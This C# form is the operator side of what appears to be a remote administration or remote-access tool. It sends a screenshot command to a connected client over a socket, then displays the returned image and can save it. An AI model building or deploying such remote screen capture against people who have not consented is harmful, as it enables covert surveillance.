using Server.Server;
using System.ComponentModel;
using System.Drawing.Imaging;
using System.Net.Sockets;

namespace Server.UI
{
    public partial class ScreenViewer : Form
    {
        private static Client client;
        private static byte[] imageStream;
        private static Image printScreenImage;
        private static Thread dataReceiveThread;

        public ScreenViewer(Client selectedClient)
        {
            InitializeComponent();
            client = selectedClient;
            Text += " - " + client.GetUsername();

            if (client.iScreenCount != 0)
            {
                screensBox.Items.Clear();
                for (int i = 0; i < client.iScreenCount; i++)
                    screensBox.Items.Insert(i, (i + 1).ToString());
                screensBox.SelectedIndex = 0;
            } 
            else
            {
                screensBox.Items.Add("1");
                screensBox.SelectedIndex = 0;
            }

        }

        public static void StartDataReceiveThread()
        {
            dataReceiveThread = new(ReceivePrintscreenData);
            dataReceiveThread.Start();
        }

        public static void ReceivePrintscreenData()
        {
            while (true)
            {
                byte[] buffer = new byte[1048576];
                try
                {
                    client.socket.Receive(buffer);
                }
                catch (SocketException)
                {
                    break;
                }

                if (buffer.Length > 0)
                {
                    imageStream = buffer;
                    ReceivePrintscreenFinish();
                    break;
                }
            }
        }

        public static void ReceivePrintscreenFinish()
        {
            using (MemoryStream stream = new MemoryStream(imageStream))
            {
                printScreenImage = Image.FromStream(stream);
            }

            if (printScreenImage != null)
                Main.uiRequests.Request(RequestUI.RequestType.UI_UPDATE_SCREENSHOT);
        }

        private void reqBtn_Click(object sender, EventArgs e)
        {
            if (screensBox.Text == null)
            {
                Log.Error("Failed to get client screens.");
                return;
            }
            SocketServer.Send(client.socket, "<PRINTSCREEN>" + screensBox.Text);
        }

        private void uiUpdateTimer_Tick(object sender, EventArgs e)
        {
            int requestID = Main.uiRequests.RequestReceived();
            if (requestID != -1) // Another thread requested UI to update requsted item.
            {
                switch (Main.uiRequests.GetRequestType(requestID)) // Check request type and call the correct function.
                {
                    case RequestUI.RequestType.UI_UPDATE_SCREENSHOT:
                        imageBox.Image = printScreenImage;
                        imageStream = Array.Empty<byte>();
                        Main.uiRequests.ClearRequestOfType(RequestUI.RequestType.UI_UPDATE_SCREENSHOT);
                        break;
                }
            }
        }

        private void ScreenViewer_Load(object sender, EventArgs e)
        {
            saveImageToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Image);
            Icon = WinIcons.Extract("shell32.dll", (int)WinIcons.ShellID.Desktop, false);
        }

        private void contextMenu_Opening(object sender, CancelEventArgs e)
        {
            if(imageBox.Image == null)
                e.Cancel = true;
        }

        private void saveImageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog SFD = new())
            {
                SFD.Title = "Save image to...";
                SFD.Filter = "JPEG File(*.jpeg)|*.jpeg";
                SFD.FileName = $"Screenshot {DateTime.Now}";

                if (SFD.ShowDialog() == DialogResult.OK)
                {
                    Bitmap bitmapImage = new(imageBox.Image);
                    bitmapImage.Save(SFD.FileName, ImageFormat.Jpeg);
                }
            }
        }
    }
}
